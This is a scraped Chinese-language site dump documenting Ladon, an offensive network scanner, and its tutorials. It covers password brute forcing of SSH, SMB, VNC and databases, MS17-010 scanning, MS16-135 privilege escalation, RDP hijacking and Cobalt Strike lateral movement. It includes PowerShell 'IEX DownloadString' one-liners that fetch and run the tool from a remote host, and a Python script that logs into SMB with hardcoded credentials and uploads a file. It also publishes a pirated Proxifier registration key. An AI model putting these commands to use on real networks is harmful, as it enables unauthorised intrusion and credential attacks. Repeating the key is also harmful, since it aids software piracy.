Ladon简介Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.1版本内置85个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。 运行环境跨平台：支持Windows、Linux、Mac等操作系统，不过更推荐Windows下使用任意权限：支持服务、System、用户等任意权限，不会因权限低或SYS就用不了各种CMD：支持远控CMD、交互式shell、webshell、powershell、反弹shell等插件化：支持Cobalt Strike插件化内存加载使用，Beacon命令行或右键可视化 使用说明 ID 主题 URL 0 Ladon文档主页 https://k8gege.org/Ladon/ 1 Ladon基础文档 http://k8gege.org/p/648af4b3.html 2 Ladon用法例子 http://k8gege.org/Ladon/example.html 3 基础用法详解 https://github.com/k8gege/Ladon/wiki/Ladon-Usage 4 Cobalt Strike https://github.com/k8gege/Aggressor 5 Exp生成器使用 https://github.com/k8gege/Ladon/wiki/LadonExp-Usage 6 高度自定义插件 https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle 7 外部模块参考 https://github.com/k8gege/K8CScan/wiki 8 PowerLadon https://github.com/k8gege/powerladon 9 PythonLadon https://github.com/k8gege/PyLadon 10 LinuxLadon https://github.com/k8gege/KaliLadon 12 漏洞演示视频 https://github.com/k8gege/K8CScan/tree/master/Video 13 Ladon6.0文档 http://k8gege.org/p/56393.html 14 Ladon6.2文档 http://k8gege.org/p/39070.html 13 Ladon6.4文档 http://k8gege.org/p/55476.html 16 Ladon6.5文档 http://k8gege.org/Ladon/WinShell.html 代理扫描 模块功能 使用教程 Socks代理扫描内网 http://k8gege.org/Ladon/proxy.html 信息收集 模块功能 使用教程 枚举远程网卡信息 http://k8gege.org/Ladon/ethscan.html 探测域名内网IP http://k8gege.org/Ladon/hostscan.html 远程执行命令(WmiExec/PsExec/AtExec/SshExec/WebShell) 模块功能 使用教程 内网远程执行命令 http://k8gege.org/Ladon/WinShell.html JspShell执行命令 http://k8gege.org/p/ladon_cs_shell.html WebShell执行命令 http://k8gege.org/Ladon/WebShell.html 反弹SHELL系列 http://k8gege.org/Ladon/ReverseShell.html 提权/降权/会话切换/模拟令牌 模块功能 使用教程 MS16-135提权 http://k8gege.org/Ladon/ms16135.html 模拟用户权限 http://k8gege.org/Ladon/runas.html RDP会话劫持 http://k8gege.org/Ladon/RdpHijack.html 暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆 模块功能 目标端口 目标系统 使用教程 SSH爆破 22端口 Linux http://k8gege.org/Ladon/sshscan.html SMB爆破/IPC/共享 445端口 Windows http://k8gege.org/Ladon/SmbScan.html WMI爆破 135端口 Windows http://k8gege.org/Ladon/WmiScan.html Netbios爆破 139端口 Windows http://k8gege.org/Ladon/NbtScan.html SMB-NtlmHash爆破 445端口 Windows http://k8gege.org/Ladon/SmbHashScan.html WMI-NtlmHash爆破 135端口 Windows http://k8gege.org/Ladon/WmiHashScan.html FTP爆破 21端口 多平台 http://k8gege.org/Ladon/ftpscan.html VNC爆破 5900端口 多平台 http://k8gege.org/Ladon/VncScan.html LDAP爆破 389端口 域环境 http://k8gege.org/Ladon/LdapScan.html Oracle爆破 1521端口 多平台 http://k8gege.org/Ladon/OracleScan.html MSSQL爆破 1433端口 Windows http://k8gege.org/Ladon/MssqlScan.html MYSQL爆破 3306端口 多平台 http://k8gege.org/Ladon/MysqlScan.html Weblogic后台爆破 7001端口 多平台 http://k8gege.org/Ladon/weblogicScan.html Tomcat后台爆破 80等端口 多平台 http://k8gege.org/Ladon/TomcatScan.html HttpBasic认证爆破 80等端口 多平台 http://k8gege.org/Ladon/HttpbasicScan.html Winrm爆破 5985/5986端口 Windows http://k8gege.org/Ladon/WinrmScan.html 自定义协议爆破 协议对应端口 对应平台 http://k8gege.org/p/53177.html PS：目标端口为服务默认端口，管理员把它改成其它端口也能爆破，目标系统也一样，指的是常见系统，如SSH跨平台的，不只是Linux的SSH，Unix、Mac、IOS、Iphone、思科各种路由器等，甚至windows上安装SSH，也一样可以爆破。还有FTP、甚至SMB也是一样，不要死板，不要死板，要懂举一反三，举一反三。 IIS密码读取 模块功能 使用教程 IIS密码读取 http://k8gege.org/Ladon/iispwd.html Web服务器/Hta服务器/Http服务器 模块功能 使用教程 Web服务器 http://k8gege.org/Ladon/webser.html PowerShell远程内存加载(无文件渗透)http://k8gege.org/Ladon/RemoteLadon.html Ladon下载最新版本：https://k8gege.org/Download"},{"title":"","date":"2020-03-28T03:39:45.632Z","updated":"2020-01-13T16:05:59.363Z","comments":true,"path":"Ladon/index3.html","permalink":"http://k8gege.org/Ladon/index3.html","excerpt":"","text":"C:\\Users\\k8gege>Ladon 192.168.1.8/24 MS17010 Ladon 6.0 By K8gege 192.168.1.8/24 load MS17010 C_Segment: 192.168.1. ============================================= 192.168.1.102 WIN-60K2B8M [Win 7 Ultimate 7601 SP 1] 192.168.1.8 MS17-010 WIN-k8gege [Win 7 SP1] 192.168.1.1 192.168.1.101 QA [Win2003] 192.168.1.15 MS17-010 WIN-80BFD3 [Win 2008 Enterprise 7601] 192.168.1.20 K8 [WIN10] 192.168.1.12 LadonPC [WIN 7 SP1] 192.168.1.36 Test 192.168.1.80 MS17-010 SmbVul [Win 2008 Enterprise 7601] ============================================= onlinePC:9 Finished! var index = 1; function type() { $(\"#id\" + index).fadeIn(); index++; } setInterval(type, 250);"},{"title":"〖教程〗Ladon提权MS16-135参数版(WIN7-2016)","date":"2020-07-25T08:25:00.000Z","updated":"2020-08-01T16:24:44.987Z","comments":true,"path":"Ladon/ms16135.html","permalink":"http://k8gege.org/Ladon/ms16135.html","excerpt":"","text":"漏洞名称Win32k 特权提升漏洞(MS16-135)(CVE-2016-7255) 漏洞等级高危 漏洞类型本地提权 漏洞描述如果 Windows 内核模式驱动程序无法正确处理内存中对象，则会存在多个特权提升漏洞。成功利用此漏洞的攻击者可以在内核模式下运行任意代码。攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全用户权限的新帐户。 攻击者必须先登录系统，然后才能利用这些漏洞。然后攻击者可以运行一个为利用这些漏洞而经特殊设计的应用程序，从而控制受影响的系统。该更新通过更正 Windows 内核模式驱动程序处理内存中对象的方式来解决这些漏洞。 影响版本microsoft:windows_10:- microsoft:windows_10:1511 microsoft:windows_10:1607 microsoft:windows_7::sp1 microsoft:windows_8.1 microsoft:windows_rt_8.1 microsoft:windows_server_2008::sp2 microsoft:windows_server_2008:r2:sp1 microsoft:windows_server_2012:- microsoft:windows_server_2012:r2 microsoft:windows_server_2016 microsoft:windows_vista::sp2 Ladon提权Ladon7.0集成该提权模块，ms16135参数版，无窗口且成功率高，原版提权会弹出窗口且容易蓝屏。 123Ladon ms16135 cmdlineCVE-2016-7255 | Windows Kernel - mode Driver / Win32k.sysVulnerable: Vista/Win7/2008/Win8.1/2012/Win10/2016 PS：1 原版：PowerShell成功率随缘，执行个10几20次才成功提权，还容易导致蓝屏2 K8版：经过修改EXP运行比较稳定，基本上执行就能成功提权，成功率非常高。3 仅支持64位系统 测试环境测试版本： Win10 1607 X64Ladon ms16135 whoami 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"〖教程〗Ladon Socks代理扫描(附Proxifier4.0注册码)","date":"2020-07-18T03:40:00.000Z","updated":"2020-08-01T16:25:09.529Z","comments":true,"path":"Ladon/proxy.html","permalink":"http://k8gege.org/Ladon/proxy.html","excerpt":"","text":"Socks代理工具windows平台Proxifier软件是一款极其强大的socks5客户端,同时也是一款强大的站长工具。Proxifier支持TCP，UDP协议，支持Xp，Vista，Win7，支持socks4，socks5，http代理协议可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。 2020年7月proxifier官方发布最新版4.0.1修复ipv6兼容问题，以及其它很多问题。 3.42支持类似chrome这样工作的69个应用程序，修复了一些第三方应用程序的兼容性。 以上更新日志，充分说明该代理工具不能保证兼容所有第3方程序，或者说兼容性不好，同样的3.31版本有人能代理Ladon，有人代理不了。 官方下载: http://www.proxifier.com/download linux/mac平台ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4, SOCKS5 或HTTP(S) 代理。支持的认证方式包括：SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。 ProxyChains代理工具非常好，真的可以兼容所有程序，不像proxifier好多程序还不定兼容，当然两者都有一定的丢包率，Ladon批量扫描功能过快超时短，可能会导致有些结果丢失，回头设置一个代理模式，提高超时放慢速度看看。 代理支持协议通过以上两平台的代理工具简介，可以看出代理客户端并不支持ICMP协议。所以使用它们代理，无法PING通内网主机。何况FRP、EW等也不支持ICMP。 支持协议1.TCP2.UDP 代理协议1.SOCKS42.SOCKS53.HTTP(S) 代理工具兼容性推荐proxifier 3.42及以上版本，最好是最新版，3.31及以前的兼容性极差，所以不推荐，我使用VM虚拟机12版本的时候，可以代理Ladon,但后面升级为15，发现很难代理，就连测试系统自带的telnet程序，都不行了。Ladon在多个虚拟机测试也是一样，但是有同事也是用3.31却可以代理使用，网上很多人也和我反应不能用。后来我看了下3.31是2016年的，就想看看官方有没更新，发现18年有个3.42版本，测试一下，兼容好多了，然后在星球发表，发表不久发现官方更新了4.0.1，只是他没写更新日志，还以为没有更新。 Proxifier通用注册码4.0.1 (2020.7.7)3.4.2 (2018.8.31)3.3.1 (2016不推荐)5EZ8G-C3WL5-B56YG-SCXM9-6QZAP（Standard Edition） Ladon工作原理由于proxifier客户端不支持ICMP或者说ew等代理工具也不支持ICMP协议，所以代理后探测存活主机就不要使用Ping或OnlinePC模块了，使用扫描模块需加noping参数，非扫描模块不需要noping。探测存活主机可使用osscan、webscan、urlscan、ms17010、smbghost等模块，他们能扫出东西不也意味着主机存活吗？ping不是唯一的探测存活主机存活方式，系统防火墙默认禁ping，使用ping探测本身就会错过很多存活主机，所以实战要结合多种方式探测。假设目标防火墙只允许smb协议通过，你用nmap端口扫描的TCP包被拦截显示成关的，但用ms17010，smbghost扫出漏洞或者用smbscan就显示密码错误拒绝访问等，这不就说明445确实开放吗？不要死板的老是停留在ping和单纯的端口扫描来探测存活主机，要考虑实际环境，OnlinePC可探测到大部分存活主机，但不等于能探测到全部存活主机，当你无法渗透已扫到的存活主机，就得尝试其它模块探测更多主机。 PS：如何验证代理是否支持ICMP协议，非常简单用系统自带命令PING目标内网IP（不要PING自己的内网哦），能PING通目标存活IP，说明代理支持ICMP协议，意味你可以像挂了目标VPN一样或者像本地一样随意扫描目标内网，如果根本PING不通，老老实实扫描时加上noping参数。 Socks代理扫描例子：Socks5代理扫描目标10.1.2段是否存在MS17010漏洞Ladon noping 10.1.2.8/24 MS17010 PS：再次强调，由于代理工具不支持ICMP，所以Ladon扫描类功能必须加noping参数，非扫描模块不需要。 实战扫描结果Linux SSH服务识别之22端口扫描 WEB HttpBanner扫描 永恒之默漏洞 SMBghost CVE-2020-0796 OSSCAN探测目标操作系统 ProtScan端口扫描 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"","date":"2020-03-28T03:39:45.632Z","updated":"2020-01-13T16:24:25.548Z","comments":true,"path":"Ladon/test.html","permalink":"http://k8gege.org/Ladon/test.html","excerpt":"","text":".title1{ color: #fafafa; letter-spacing: 0; text-shadow: 0px 1px 0px #999, 0px 2px 0px #888, 0px 3px 0px #777, 0px 4px 0px #666, 0px 5px 0px #555, 0px 6px 0px #444, 0px 7px 0px #333, 0px 8px 7px #001135; } K8哥哥"},{"title":"VncScan 5900端口弱口令/VNC密码爆破","date":"2020-07-05T06:30:00.000Z","updated":"2020-08-01T16:26:35.772Z","comments":true,"path":"Ladon/vncscan.html","permalink":"http://k8gege.org/Ladon/vncscan.html","excerpt":"","text":"Ladon5900端口 VNC密码爆破Ladon 192.168.1.8/24 VncScan PowerLadon远程加载VncScan 5900端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.141 VncScan” 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"about","date":"2018-09-30T09:25:30.000Z","updated":"2019-12-16T16:22:45.596Z","comments":true,"path":"about/index.html","permalink":"http://k8gege.org/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-12-09T12:22:07.000Z","updated":"2019-12-16T16:20:15.571Z","comments":true,"path":"categories/index.html","permalink":"http://k8gege.org/categories/index.html","excerpt":"","text":""},{"title":"contact","date":"2019-12-16T16:40:40.000Z","updated":"2019-12-16T16:40:53.251Z","comments":true,"path":"contact/index.html","permalink":"http://k8gege.org/contact/index.html","excerpt":"","text":""},{"title":"friends","date":"2019-12-16T16:07:31.000Z","updated":"2019-12-21T05:20:20.221Z","comments":true,"path":"friends/index.html","permalink":"http://k8gege.org/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-12-09T12:22:43.000Z","updated":"2019-12-16T16:21:10.311Z","comments":true,"path":"tags/index.html","permalink":"http://k8gege.org/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"〖教程〗NbtScan 139端口弱口令/Netbios密码爆破","slug":"NbtScan","date":"2020-08-01T07:20:00.000Z","updated":"2020-08-01T16:31:57.006Z","comments":true,"path":"p/NbtScan.html","link":"","permalink":"http://k8gege.org/p/NbtScan.html","excerpt":"","text":"=============================================================================================+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/NbtScan.html\"; 版本Ladon &gt;= 7.1 139端口NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows”文件和打印机共享”和SAMBA。 IPC$通信Windows系统中的net use ipc$整个通信过程，先445-&gt;137-&gt;139验证，当你开启防火墙禁用445，发现系统命令就无法连接IPC了，根本没机会走到139，所以使用系统自带命令连接的ipc$需要同时开启这些端口。说入侵139就是IPC$的说法是错误的，就像说wmiexec.vbs可完全替代PSEXEC工具一样，这个脚本需要目标开启135和445，因为它通过445来传输结果，意味着目标只开放135这个VBS的回显就没有了，其实假设目标只开放445，这个VBS脚本还能执行命令吗？哪来的替代或扔掉？这个系统的IPC$连接也是同理，测试首先得把其它端口禁了再说话。虽然系统自带命令需要同时开启，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的，详情参考impacket。 Nbt爆破系统自带命令需要同时开启139和445，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的。系统的IPC$就像读取系统密码一样，可以先植入CS再用MIMI插件读取，但是我们也可以不使用CS，直接MIMI读取密码啊。基于和MIMI可以独立读取密码的原理，反向思路我们也可以完全不走445，直接通过139验证WINDOWS密码，所以这个和IPC$不一样(指的是系统命令连接的ipc)，所以为了防止大家误解，起名为NbtScan。毕竟走的也是Netbios，系统IPC$验证一是时间非常久，且必须开启445，如果445都开了为何不用SmbScan验证密码呢？但是由于近几年勒索病毒横行，可能很多机器默认会关闭445，所以会导致无法通过445验证密码，但是没关系还有139啊。 Ladon139端口 Netbios密码爆破(Windows)Ladon 192.168.1.8/24 NbtScan PowerLadon远程加载NbtScan 139端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon7.1_all.ps1&#39;); Ladon 192.168.1.141 NbtScan” 139传输文件123456789101112131415161718192021222324#!/usr/bin/env python#coding:utf-8from smb.SMBConnection import SMBConnectionfrom nmb.NetBIOS import NetBIOSimport os,sysdef getBIOSName(remote_smb_ip, timeout=30): try: bios = NetBIOS() srv_name = bios.queryIPForName(remote_smb_ip, timeout=timeout) except: print &gt;&gt; sys.stderr, \"Looking up timeout, check remote_smb_ip again!!\" finally: bios.close() return srv_nameserverip='192.168.1.40'conn = SMBConnection('k8gege', 'k8gege520', 'C$',getBIOSName(serverip)[0], use_ntlm_v2 = True) assert conn.connect(serverip, 139)#temdir='/'#dir=os.path.join('/','public')f = open('C:/123.txt', 'rb')conn.storeFile('Users','234.txt',f)f.close() 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"netbios","slug":"netbios","permalink":"http://k8gege.org/tags/netbios/"}]},{"title":"〖教程〗Ladon Socks代理扫描(附Proxifier4.0注册码)","slug":"Ladon_proxy","date":"2020-07-18T03:40:00.000Z","updated":"2020-07-18T04:07:00.638Z","comments":true,"path":"p/proxy.html","link":"","permalink":"http://k8gege.org/p/proxy.html","excerpt":"","text":"=============================================================================================+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/proxy.html\"; Socks代理工具windows平台Proxifier软件是一款极其强大的socks5客户端,同时也是一款强大的站长工具。Proxifier支持TCP，UDP协议，支持Xp，Vista，Win7，支持socks4，socks5，http代理协议可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。 2020年7月proxifier官方发布最新版4.0.1修复ipv6兼容问题，以及其它很多问题。 3.42支持类似chrome这样工作的69个应用程序，修复了一些第三方应用程序的兼容性。 以上更新日志，充分说明该代理工具不能保证兼容所有第3方程序，或者说兼容性不好，同样的3.31版本有人能代理Ladon，有人代理不了。 官方下载: http://www.proxifier.com/download linux/mac平台ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4, SOCKS5 或HTTP(S) 代理。支持的认证方式包括：SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。 ProxyChains代理工具非常好，真的可以兼容所有程序，不像proxifier好多程序还不定兼容，当然两者都有一定的丢包率，Ladon批量扫描功能过快超时短，可能会导致有些结果丢失，回头设置一个代理模式，提高超时放慢速度看看。 代理支持协议通过以上两平台的代理工具简介，可以看出代理客户端并不支持ICMP协议。所以使用它们代理，无法PING通内网主机。何况FRP、EW等也不支持ICMP。 支持协议1.TCP2.UDP 代理协议1.SOCKS42.SOCKS53.HTTP(S) 代理工具兼容性推荐proxifier 3.42及以上版本，最好是最新版，3.31及以前的兼容性极差，所以不推荐，我使用VM虚拟机12版本的时候，可以代理Ladon,但后面升级为15，发现很难代理，就连测试系统自带的telnet程序，都不行了。Ladon在多个虚拟机测试也是一样，但是有同事也是用3.31却可以代理使用，网上很多人也和我反应不能用。后来我看了下3.31是2016年的，就想看看官方有没更新，发现18年有个3.42版本，测试一下，兼容好多了，然后在星球发表，发表不久发现官方更新了4.0.1，只是他没写更新日志，还以为没有更新。 Proxifier通用注册码4.0.1 (2020.7.7)3.4.2 (2018.8.31)3.3.1 (2016不推荐)5EZ8G-C3WL5-B56YG-SCXM9-6QZAP（Standard Edition） Ladon工作原理由于proxifier客户端不支持ICMP或者说ew等代理工具也不支持ICMP协议，所以代理后探测存活主机就不要使用Ping或OnlinePC模块了，使用扫描模块需加noping参数，非扫描模块不需要noping。探测存活主机可使用osscan、webscan、urlscan、ms17010、smbghost等模块，他们能扫出东西不也意味着主机存活吗？ping不是唯一的探测存活主机存活方式，系统防火墙默认禁ping，使用ping探测本身就会错过很多存活主机，所以实战要结合多种方式探测。假设目标防火墙只允许smb协议通过，你用nmap端口扫描的TCP包被拦截显示成关的，但用ms17010，smbghost扫出漏洞或者用smbscan就显示密码错误拒绝访问等，这不就说明445确实开放吗？不要死板的老是停留在ping和单纯的端口扫描来探测存活主机，要考虑实际环境，OnlinePC可探测到大部分存活主机，但不等于能探测到全部存活主机，当你无法渗透已扫到的存活主机，就得尝试其它模块探测更多主机。 PS：如何验证代理是否支持ICMP协议，非常简单用系统自带命令PING目标内网IP（不要PING自己的内网哦），能PING通目标存活IP，说明代理支持ICMP协议，意味你可以像挂了目标VPN一样或者像本地一样随意扫描目标内网，如果根本PING不通，老老实实扫描时加上noping参数。 Socks代理扫描例子：Socks5代理扫描目标10.1.2段是否存在MS17010漏洞Ladon noping 10.1.2.8/24 MS17010 PS：再次强调，由于代理工具不支持ICMP，所以Ladon扫描类功能必须加noping参数，非扫描模块不需要。 实战扫描结果Linux SSH服务识别之22端口扫描 WEB HttpBanner扫描 永恒之默漏洞 SMBghost CVE-2020-0796 OSSCAN探测目标操作系统 ProtScan端口扫描 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Proxy","slug":"Proxy","permalink":"http://k8gege.org/tags/Proxy/"}]},{"title":"Ladon大型内网渗透扫描器&Cobalt Strike","slug":"Ladon最新版","date":"2020-07-17T14:30:24.000Z","updated":"2020-08-02T09:46:01.472Z","comments":true,"path":"p/648af4b3.html","link":"","permalink":"http://k8gege.org/p/648af4b3.html","excerpt":"Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.0版本内置83个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息","text":"Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.0版本内置83个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息 Ladon for Windows Ladon GUI Ladon for Cobalt Strike Ladon for PowerShell Python Ladon Ladon for Linux 使用说明 ID 主题 URL 0 Ladon文档主页 https://k8gege.org/Ladon/ 1 Ladon基础文档 http://k8gege.org/p/648af4b3.html 2 Ladon用法例子 http://k8gege.org/Ladon/example.html 3 基础用法详解 https://github.com/k8gege/Ladon/wiki/Ladon-Usage 4 Cobalt Strike https://github.com/k8gege/Aggressor 5 Exp生成器使用 https://github.com/k8gege/Ladon/wiki/LadonExp-Usage 6 高度自定义插件 https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle 7 外部模块参考 https://github.com/k8gege/K8CScan/wiki 8 PowerLadon https://github.com/k8gege/powerladon 9 PythonLadon https://github.com/k8gege/PyLadon 10 LinuxLadon https://github.com/k8gege/KaliLadon 12 漏洞演示视频 https://github.com/k8gege/K8CScan/tree/master/Video 13 Ladon6.0文档 http://k8gege.org/p/56393.html 14 Ladon6.2文档 http://k8gege.org/p/39070.html 13 Ladon6.4文档 http://k8gege.org/p/55476.html 16 Ladon6.5文档 http://k8gege.org/Ladon/WinShell.html 源码编译git clone https://github.com/k8gege/Ladon.git使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE 成品下载https://github.com/k8gege/Ladon/releasesWin7/2008或安装.net 2.x 3.x系统可使用Ladon.exeWin8-win10或安装.net 4.x系统可使用Ladon40.exe 前言无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。 关于LadonLadon音译: 拉登或拉冬。因集成了很多模块，每个模块又可独立成为一个工具，和百头巨龙有很多头类似。Ladon是希腊神话中的神兽，看守金苹果的百头巨龙。它从不睡觉，被赫拉克勒斯借扛天巨人之手诱巨龙睡着杀死巨龙并偷得了金苹果。巨龙死前将自己的魂魄封印在金苹果中，偷盗者将金苹果送给了白雪公主，公主为了报恩将金苹果分给了七个小矮人，吃下以后他们变成了龙珠散落到世界各地，龙珠分为七颗，它蕴含着可以令奇迹发生的力量。当集齐7颗龙珠念出咒语，就能召唤神龙，而神龙则会实现召唤者提出的一个愿望。 程序简介Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.1版本内置85个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。 使用简单虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手只需一或两个参数就可用90%的功能,一个模块相当于一个新工具 运行环境WindowsLadon.exe可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透 Linux、Mac安装Mono运行时,将KaliLodan改名为Ladon,通过mono执行Ladon即可。 123apt install mono-runtimewget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladonmono Ladon 192.168.1.8/24 OnlinePC 由于mono的兼容性，不保证Mac或Linux下所有功能均可用就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好测试发现有些功能的稳定性以及速度没有Windows系统快未列功能系未测试或暂不可用功能，使用前请先看说明 实测：在Kali 2019下可使用功能较多，Ubuntu兼容性比不上Kali，MacOS未对所有功能进行测试 奇葩条件实战并不那么顺利，有些内网转发后很卡或无法转发，只能将工具上传至目标有些马可能上传两三M的程序都要半天甚至根本传不了，PY的几十M就更别想了Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传500K程序吧还不行也可PowerShell远程内存加载,这点是PY或GO编译的大程序无法比拟的 宗旨一条龙服务，为用户提供一个简单易用、功能丰富、高度灵活的扫描工具 特色扫描流量小程序体积小功能丰富强大程序简单易用插件支持多种语言跨平台(Win/Kali/Ubuntu)等支持Cobalt Strike插件化支持PowerShell无文件渗透Exp生成器可一键定制Poc多版本适用各种环境 程序参数功能1 支持指定IP扫描2 支持指定域名扫描3 支持指定机器名扫描4 支持指定C段扫描(ip/24)5 支持指定B段扫描(ip/16)6 支持指定A段扫描(ip/8)7 支持指定URL扫描8 支持批量IP扫描(ip.txt)9 支持批量C段扫描(ip24.txt)10 支持批量B段扫描(ip16.txt)11 支持批量URL扫描(url.txt)12 支持批量域名扫描(domain.txt)13 支持批量机器名扫描(host.txt)14 支持批量字符串列表(str.txt)15 支持主机帐密列表(check.txt)16 支持用户密码列表(userpass.txt)17 支持指定范围C段扫描18 支持参数加载自定义DLL（仅限C#）19 支持参数加载自定义EXE（仅限C#）20 支持参数加载自定义INI配置文件21 支持参数加载自定义PowerShell22 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)23 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)24 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)25 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等26 INI配置支持自定义程序密码爆破 内置功能模块(58)0x001 资产扫描(11)例子: Ladon OnlinePC(扫当前机器所处C段，其它模块同理)例子: Ladon 192.168.1.8/24 OnlinePC ID 模块名称 功能说明 返回结果 1 Ping 存活主机扫描 存活IP(探测速度很快3-6秒/C段) 2 OnlinePC 存活主机扫描 存活IP、Mac地址、机器名、设备制造商 3 OnlineIP 仅存活主机IP 存活IP 4 UrlScan URL域名扫描 同服URL（不验证IP、域名、Web标题） 5 SameWeb 同服域名扫描 同服URL（验证IP、域名、Web标题） 6 WebScan Web信息扫描 存活IP、主机名、Banner、Web标题 7 WebDir 后台目录扫描 地址、HTTP状态 8 SubDomain 子域名爆破 子域名 (可用DomainIP/HostIP解析) 9 DomainIP 域名解析IP 域名、IP 10 HostIP 主机名转IP IP、域名 11 AdiDnsDump 域内机器信息获取(非域内请使用LdapScan探测) IP、域名 